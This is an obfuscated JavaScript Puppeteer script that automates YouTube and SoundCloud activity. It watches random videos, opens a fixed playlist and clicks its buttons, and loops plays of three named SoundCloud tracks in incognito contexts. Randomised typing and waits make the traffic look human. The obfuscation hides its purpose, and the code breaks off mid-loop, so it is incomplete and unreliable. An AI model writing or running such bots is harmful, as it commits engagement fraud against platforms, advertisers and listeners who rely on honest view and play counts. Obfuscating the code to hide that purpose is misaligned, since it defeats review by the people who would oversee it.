const Y = b,
  X = d,
  W = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1866 + -0xdba + 0x2621))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x2fe * 0x6 + 0x2 * 0xbf + 0x1076), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1 * 0xbede + 0x5bff * 0x2 + -0x101ac + (0xc * -0x3f2 + 0xa * -0x731 + 0x5 * 0x2392) * random()) : await standardWaitForNetIdle(f), await wait(0x1 * -0x1f52 + 0x1207 + 0x20d3 + (-0x43 * -0xb1 + 0x15 + -0x758) * random()), -0xcef + 0x22bb + 0x31d * -0x7;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x9ad + 0xd * 0x1e6 + 0x73 * -0x21), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * 0x1d81 + -0x1 * 0x224b + 0x3fcd;
}
async function randomWait() {
  return await wait(0x1937 + -0x1 * -0x130d + -0x18bc + (0x1086 + -0x39 * 0x22 + 0x2a5 * 0x4) * random()), -0xfc6 + 0x446 * -0x5 + 0x2525;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * -0x1d87 + 0xbcd * -0x1 + -0x11ba * 0x1, -0x13 * -0x93 + 0x1733 * -0x1 + -0x1 * -0xc51), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x144ce + -0x1 * 0x72f7 + 0x2a225 * 0x1) * getRandomInt(0xd13 * 0x2 + 0x178 * -0xd + -0x70c, 0x4a3 + -0x13b3 + -0x1b * -0x8f), h)), -0x2 * 0xb55 + -0x2df + 0xcc5 * 0x2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1 * -0x1a99 + 0xfa1 * 0x1 + -0x138 * -0x9;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x354 * -0x1 + 0xfee * -0x1 + 0x1343 * 0x1]['split']('\x20');
    for (let k = 0x3 * 0x14b + 0xf23 + -0x1304; k < i['length']; k += -0x1 * -0x19cb + 0xd4e + -0x2717)
      j += i[k] * h[i[k + (-0x3 * -0x40d + 0x1a98 + -0x26be)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + R(0x3, 'cnX@') + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1a6e + 0x1aad + -0x3515)['map'](l => Array['from'](l['children']))['flat'](-0x1276 + -0x1249 * 0x2 + 0x3709)['map'](l => l['childNodes'][-0x12cb + 0x313 * 0xb + 0x301 * -0x5]['childNodes'][-0x1f98 + 0x2459 + -0x4c1]['childNodes'][0x2025 * 0x1 + -0x29 * -0xcd + -0x40f9]['childNodes'][0x1f41 + 0x16c2 + -0x3603]['childNodes'][-0x11cd + 0x209f + -0xed1 * 0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1b55 + -0x164c * 0x1 + -0x1 * -0x3589, 0x1bca + 0x1a2d * 0x1 + -0x226f)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x14b8 + 0x2bb2 + -0x5d2);
  const h = await getMaxTime(f),
    i = Math['min']((-0x2911 + 0x103d7 + -0xf9a * -0x1) * getRandomInt(0x20a2 * -0x1 + -0x1c1c + 0x3cc0, -0x24ee + 0x128b * -0x1 + 0x377e), h);
  return await wait(i), 0x97a + -0x2e2 * 0x9 + 0x1079;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xed * -0xf + 0x65f + 0x1 * -0x1442]['children'][0x1 * 0x245e + 0x88b + -0x2ce9]['children'][0x23 * -0x61 + 0x2 * 0x23c + 0x8cb * 0x1]['children'][-0x17a1 * 0x1 + 0x194d + -0x1ac]['children'][-0x193c + -0x1 * -0x1248 + -0x164 * -0x5]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2 * -0x11a5 + 0x157 * -0x1b + 0x4778;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1 * -0x88a + -0xaab + 0x1399 * 0x1 + (0x1 * -0xaf3 + 0x1 * -0x24fa + 0x301f) * random()
  }), await wait(0x2545 + -0x1 * -0x2164 + 0x7b * -0x8f + (-0x1293 + 0x12b8 + 0x107) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const S = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))[S(0x6)](p => p['childNodes'][0x19bb + -0x4b8 + -0x1501]['childNodes'][-0x16de + -0x2441 + -0x1d90 * -0x2]['childNodes'][-0x40 * 0x38 + 0x189d + -0x1c * 0x61]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1 * -0x2137 + 0x106 * 0x22 + -0x190]['childNodes'][-0xb76 + -0x1a7e * 0x1 + 0x25f4]['childNodes'][-0x27b + 0x126d + 0x198 * -0xa]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x2396 * 0x1 + -0x1ae1 + -0x8b4),
          r = -0xa6a + 0xbc1 + -0x31 * 0x7;
        for (let u = -0xe * 0xb + -0x2450 + 0xf * 0x276; u < q['length']; u += 0x4da * -0x1 + 0x20c7 + 0x7 * -0x3fd)
          r += q[u] * k[q[u + (-0x1e01 * 0x1 + 0xfe * 0x18 + 0x632)]];
        return r;
      }(n);
  });
  await wait((0xebf + 0xa38 + 0x21a1 * 0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x2b * -0x446 + -0x1fb * 0x1 + 0x1a41d) * getRandomInt(0xac6 + 0x6b9 + -0x117e, -0x1548 + -0x2ef + 0x1841), h + (-0x1 * 0x146d + 0x2199 + -0x197 * -0x4));
  return await wait(i), -0x3 * -0x30b + -0x3 * 0x2f + -0x893;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x90b + -0x3 * 0x55d + 0x29 * 0x2c), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x37a + 0x594 + 0x2aa + (0xaba + -0x24af + 0x1ddd * 0x1) * Math['random']());
    });
  }, 0x1488 * -0x2 + -0x2dbe + 0x7226);
  await wait(-0x177c7 * -0x1 + -0x2 * 0x2b449 + 0x884ab);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x13bb2 + 0x205 * 0x1 + 0x2240d) * getRandomInt(0xf9 * -0xe + 0xbc * -0x2f + 0x3026, 0x786 + 0x8d + -0x7fa)), clearInterval(h), -0x3 * -0xf9 + 0x65c + 0x2 * -0x4a3;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x11 * 0x5f + 0x2597 + -0x2be6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xb * 0x219 + -0x36 * -0x49 + -0x2678;
    await randomWait();
  }
  return 0x4 * 0x71 + 0x1b83 * -0x1 + 0x20 * 0xce;
}

function fetchRandomSC() {
  const T = d;
  return Math['random']() <= 0x1f99 * -0x1 + 0x1 * 0x82c + 0x176d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x30f * -0x3 + 0x1849 * 0x1 + 0x2176 * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + T(0xe) + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x4cb * -0x5 + -0x1171 + 0xd4 * 0x32 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x142d * 0x1 + 0x132b * -0x1 + -0x102;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xf0cd + 0x11d8b + -0x15e90 + getRandomInt(0x567b + -0x4ce3 + 0x10 * 0x310, -0x69d7 + 0xd10e + -0x1ff * -0x7));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x4 * 0x45f + -0xae + -0x10cd), r = await f[U(0x9, 'CBF%') + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0xc6 * -0x5 + -0x1 * 0x14a4 + 0x2 * 0xc41;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1e12 + 0x63 + -0x1e75, 0xdaf + 0x3 * -0x5db + -0x1 * -0x414)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x7 * 0x3c1 + 0x81 * 0x1d + 0x137a + floor((-0xe12 + 0x10c0 + 0x2 * 0x9d) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xe186e920 + 0xe215ee98 + -0x1439cd7b8),
          -0x1 * 0xc1c280 + 0xc47f5a + 0x7d4326,
          -0x3f75 + -0xf3b2 * -0x1 + -0x343d,
          0x7a8 + -0x1363 * 0x1 + -0x1 * -0xc3b
        ], y = [
          0x220c + -0x16c7 + 0xb2d * -0x1,
          -0x45 * 0x59 + -0x5 * 0x3c2 + -0xb * -0x3e5,
          0xa32 + 0x98d + -0x13b7,
          -0x1 * -0x1021 + -0xb * -0x26b + -0x2aba
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1ad8 + 0x1305 + -0x4 * 0xb77)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0xa84 * -0x2 + -0xb3 * 0x1 + 0x15bb; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('const V = b;require(V(17, \'Nq#L\'));'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xc0 * 0x4 + 0x25ee + -0x22ee) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0xff9 + -0x842 + 0x5 * -0x18b] = A[0x1 * -0x3 + -0x2 * 0xace + 0x15af] = A[-0x3 * -0xa67 + -0x1ff3 + 0xbf * 0x1] = A[0x81b * -0x2 + 0x1c3 * -0x7 + -0x1 * -0x1c8d] = A[-0x1c23 + -0x89b * 0x1 + 0x61 * 0x61] = A[-0x137 * -0x3 + 0x1cfe + 0x7 * -0x4a9] = A[-0xba8 + 0x176b + -0xbbe] = A[-0x3f5 + 0x1 * -0xb9b + -0x39 * -0x46] = A[0x215f + 0x325 + -0x247d * 0x1] = A[0x1605 + -0xc81 + 0x97c * -0x1] = A[0xe7f + -0x1743 + 0x8cd] = A[0x447 + -0x81a + 0x3dd] = A[-0x1c0b + -0x1fb5 + -0x1 * -0x3bcb] = A[0x2479 * -0x1 + 0x1 * 0x2023 + 0x462] = A[-0x134c + 0x1e13 * -0x1 + 0x18b6 * 0x2] = A[0x266 * 0xa + -0x14b * -0xd + -0x28bd] = A[-0x172e + -0x959 * -0x2 + 0x48b] = -0x14b2 + 0x1f62 + -0xab0, this['blocks'] = A) : this['blocks'] = [
                -0xaea + 0x2 * 0xad8 + -0x1 * 0xac6,
                0xa7 * 0x27 + 0x43 * 0x8f + -0x3ede,
                -0x1715 * -0x1 + 0x897 + -0x1fac,
                -0x27 * 0xa3 + -0x905 + 0x21da,
                -0x3d * -0x47 + 0x3bd + -0x295 * 0x8,
                0x3e2 + -0x1 * -0x18e + -0x570,
                -0x2653 + 0x106b + 0x15e8,
                0x1a44 + 0x112a + -0x2b6e,
                0x19 * -0x7c + -0x1cf7 * -0x1 + -0x5 * 0x35f,
                0x1f61 + 0xcc5 + -0x2c26,
                -0x14b * 0xd + -0x13e + -0x1 * -0x120d,
                0x777 + 0x21ee + -0x2965,
                0xf * -0xa2 + -0x6ff + 0x107d,
                0x157c + -0x20c4 + 0xb48,
                0x8 * -0x3f3 + -0x2600 + 0x44 * 0x106,
                0x1e54 + 0x1b5c + 0x11c * -0x34,
                0x1b7 * -0xb + 0x25ec + -0x77 * 0x29
              ], this['h0'] = 0x6c1b80 + -0x91938a0 + 0x377 * 0x204f27, this['h1'] = -0x16c6aa1 * 0xed + -0x11deb209a + 0x35f178330, this['h2'] = 0x1 * 0xaf202621 + 0x742d5ef3 * -0x1 + 0x5dc815d0, this['h3'] = 0x1910 * 0xe0a2 + 0x3879e5e + -0x3 * 0x31bb758, this['h4'] = 0xb * 0x18909a39 + 0xa7c807e3 * -0x1 + 0xde46 * 0x6b90, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x12f * 0x9 + 0x6f1 + -0x1198, this['finalized'] = this['hashed'] = 0x2 * 0x125d + -0x1363 + -0x1157 * 0x1, this['first'] = -0x17c9 + 0x1b47 + -0x37d;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x194b + 0x12d * 0x1e + 0x7 * -0x8a7, O = J['length'] || -0x2c2 * 0x3 + -0xc3c + 0x19 * 0xd2, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x12e1 * 0x1 + 0x14fa + -0xb3 * 0x39, P[-0x689 + 0xd * -0x2ef + 0x2cac] = this['block'], P[-0x1d73 + 0x246a + -0x6e7] = P[-0x637 + -0x81 + 0x6b9] = P[-0xc6d * 0x1 + 0x3ec + 0x883] = P[-0xc6f + -0x1c47 * 0x1 + 0xd93 * 0x3] = P[-0x1 * 0x107a + 0x18a * -0x1 + 0x1208] = P[0xc * -0x238 + 0x25b + 0x184a] = P[-0x77 * -0x1d + 0xd0c + -0x1a81] = P[-0x72f * 0x1 + 0x1c8b + -0x1555] = P[-0x5d2 + -0x13 * 0xa7 + 0x123f] = P[-0x3b9 * -0x7 + -0x5c * 0xe + -0x14fe] = P[0x1839 + -0x14b5 + -0x37a] = P[-0x17 * 0xab + 0x59a + 0x1f6 * 0x5] = P[-0x1fbb * -0x1 + -0xab * 0x23 + -0x84e] = P[-0x2 * -0x883 + 0x1 * 0xceb + -0x1de4] = P[-0x6ab + 0xfb + -0x2 * -0x2df] = P[0x1 * -0x1cc7 + -0x1783 + 0x9 * 0x5d1] = 0x5 * 0x49d + -0x14d9 + -0x47 * 0x8), K) {
                    for (N = this['start']; M < O && N < -0x1 * 0x2590 + 0x6 * 0xac + 0xbc * 0x2e; ++M)
                      P[N >> -0x1652 + -0x1fd4 + 0x3628] |= J[M] << y[-0x12 * -0x1de + 0x1 * -0x64d + -0x1b4c & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1e86 * -0x1 + -0x201 + -0x1 * 0x1c45; ++M)
                      (L = J['charCodeAt'](M)) < -0x227b + 0x1 * -0x1fdf + -0xc7 * -0x56 ? P[N >> -0x1 * -0x17ba + 0x1c0f + -0x33c7] |= L << y[-0x1 * -0x2617 + -0x1263 + 0x13b1 * -0x1 & N++] : L < -0x790 + -0x1a63 + -0x29f3 * -0x1 ? (P[N >> 0x1cca + -0x1 * 0x247b + 0x7b3] |= (-0x15 * 0x26 + 0x2 * 0x417 + 0xc * -0x5c | L >> 0x1c30 + 0x25b7 + -0x41e1) << y[-0x14ed + 0x170e + -0x21e * 0x1 & N++], P[N >> -0x25bd + -0x257f + 0x4b3e] |= (-0xbf7 * 0x1 + -0x1 * -0x102b + 0x3 * -0x13c | 0xf1a + 0x21b0 + -0x308b & L) << y[-0x1d6b * 0x1 + 0x1958 + 0x416 & N++]) : L < -0xb09f + 0x39 * 0x10c + 0x14cf3 || L >= -0x12fb8 + 0x98 * 0xc4 + 0x336b * 0x8 ? (P[N >> 0x13 * -0x163 + 0xfb * 0x3 + 0xbb5 * 0x2] |= (-0x43 * -0x61 + 0x1 * -0x1b16 + -0x293 * -0x1 | L >> 0x1a2 * -0x5 + 0x25ba + 0x1d84 * -0x1) << y[0x92c * -0x2 + 0x1b * 0xd + -0x2 * -0x87e & N++], P[N >> -0xa8a + -0x22fe + 0xc9 * 0x3a] |= (-0x8e1 * 0x1 + 0x15bc + -0xc5b | L >> -0x53b + -0x1 * -0x125f + -0xd1e & -0x111 * -0x5 + 0x6f + -0x585 * 0x1) << y[-0x59 * 0x44 + -0x2 * 0x1215 + 0x3bd1 & N++], P[N >> -0x1961 + 0x2335 + -0x9d2] |= (0x211a * 0x1 + 0x253f + -0x1 * 0x45d9 | 0xc2d + -0x14d5 * -0x1 + 0x1 * -0x20c3 & L) << y[0x12b * 0x1 + 0x1d1d + 0x7b * -0x3f & N++]) : (L = -0x5a95 + 0xc423 + 0x3226 * 0x3 + ((0x11de + -0x6fd * -0x2 + 0x1bd9 * -0x1 & L) << 0x3a * -0x83 + -0x16a8 + 0x3460 | -0x5 * 0x55e + -0x954 + 0x2829 & J['charCodeAt'](++M)), P[N >> 0x1d2 * -0x10 + 0x9c5 * -0x1 + 0x1 * 0x26e7] |= (0xc6 + 0xabd * 0x3 + -0x200d | L >> -0x5f6 + 0x24a6 * -0x1 + 0x2aae) << y[0xc37 + -0x6 * 0x577 + 0x1496 & N++], P[N >> 0x22d6 + -0x762 * -0x5 + -0x47be] |= (-0x126 + 0x109e + -0xef8 | L >> 0x14ae + 0x23a7 + -0x641 * 0x9 & 0x1d96 + -0x1ed2 + 0x17b) << y[-0x82 * -0x3c + 0x93 * 0x29 + -0x3600 & N++], P[N >> 0x26e3 + -0x1 * -0x1823 + 0x1b4 * -0x25] |= (0x1d * 0x105 + -0x10 * -0x239 + -0x40a1 | L >> 0x151c + -0x121 + -0x13f5 & -0x1be * 0xa + 0xc5b + 0x2a8 * 0x2) << y[-0x226b + 0x199a + -0x1 * -0x8d4 & N++], P[N >> 0x187d + -0x1bd6 + 0x35b] |= (0x1ade * 0x1 + -0x168 + -0x18f6 | -0x2 * -0x9f5 + -0x1f2d + -0x6 * -0x1eb & L) << y[-0xc61 * 0x1 + -0x127a + -0x2 * -0xf6f & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x68b + -0x21 * -0x62 + -0x5d7 ? (this['block'] = P[-0x13d * -0x1 + 0x1a1 * -0x1 + -0x2 * -0x3a], this['start'] = N - (-0x10ca + -0x320 + -0x142a * -0x1), this['hash'](), this['hashed'] = -0x1969 + 0x1f1c + -0x2 * 0x2d9) : this['start'] = N;
                }
                return this['bytes'] > 0xa5aaffc4 + 0xc8671f * 0x1a1 + -0xc * 0x13acea1b && (this['hBytes'] += this['bytes'] / (0x118d4ed08 + 0x1bd9bea58 + -0x1d670d760) << -0x697 + -0x3 * -0xb66 + -0x1b9b, this['bytes'] = this['bytes'] % (0x2 * -0x97b2bce6 + -0x6 * -0x41e64eee + 0xa3ffa038)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x231a + -0xc58 + -0x19 * 0xe9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x9dd * -0x1 + 0xc7 * -0x30 + 0x2f3d] = this['block'], J[K >> 0x2307 + 0x10b3 + -0x19dc * 0x2] |= x[-0x1aff + 0x5c * -0x3d + -0x1 * -0x30ee & K], this['block'] = J[-0x3 * -0x43f + 0x3e5 + -0x7 * 0x25e], K >= 0x3c7 + -0x35 * -0x19 + 0x8bc * -0x1 && (this['hashed'] || this['hash'](), J[0x6fd * 0x3 + 0x1c9 * 0x1 + 0x68 * -0x38] = this['block'], J[-0x331 + -0x1021 + 0x1362] = J[-0x105 * -0xf + -0x14b8 + -0xa * -0x8b] = J[-0xce * 0x11 + 0xd2f + 0x2b * 0x3] = J[0x5a2 * 0x1 + -0x29 * 0x13 + -0x294] = J[0xb * -0x132 + -0x251c + -0x6 * -0x861] = J[0x1251 + -0x1a45 + 0x7f9 * 0x1] = J[-0xd * 0x1f0 + -0x1 * 0x495 + 0x1d * 0x107] = J[-0x4bb + 0x1f21 * 0x1 + -0x1a5f] = J[0xbfa + -0x959 * 0x1 + 0x299 * -0x1] = J[0x539 * -0x1 + 0xe * 0x12a + -0xb0a] = J[-0x139 * -0x6 + 0x253e + -0x2c8a * 0x1] = J[-0x85 * -0x2e + -0x10f * -0x17 + -0x3034] = J[-0x34f * -0x4 + -0x8a2 + -0x48e] = J[-0x1a21 * 0x1 + 0x1 * -0xe71 + 0x289f] = J[-0x1237 + 0x11 * -0x53 + 0x17c8] = J[0x265d * -0x1 + 0x148 * 0x3 + 0x114a * 0x2] = 0x25eb + -0x1 * 0x2456 + -0x195), J[-0x187e + -0xc06 + 0x2492] = this['hBytes'] << -0xfbc + 0x5 * 0x45f + -0x5c * 0x11 | this['bytes'] >>> 0x1794 + -0x6bb + -0x10bc, J[0x1a9e * 0x1 + 0xf46 + 0x29d5 * -0x1] = this['bytes'] << 0x752 + 0x73 * -0x55 + -0x3dc * -0x8, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0xbe1 + -0x9c + 0xc8d; J < -0x6 * 0x3e8 + 0x1ff0 + -0x830; ++J)
                K = Q[J - (-0x123f + 0x218e + -0xf4c * 0x1)] ^ Q[J - (-0x25c2 + -0xc10 + -0x31da * -0x1)] ^ Q[J - (-0x266f * 0x1 + 0xa6a + 0x1 * 0x1c13)] ^ Q[J - (0x97a * 0x4 + -0x3 * -0xeb + 0x2899 * -0x1)], Q[J] = K << -0x1e8a + 0x2 * 0x33d + 0x1811 | K >>> 0x29 * -0xa1 + -0x6a1 * -0x5 + -0x73d;
              for (J = 0x2 * -0x8b + 0xc87 * -0x1 + 0xd9d; J < -0x23e5 + -0x1159 + 0x3552; J += -0x563 + 0x5 * 0x707 + -0x1dbb)
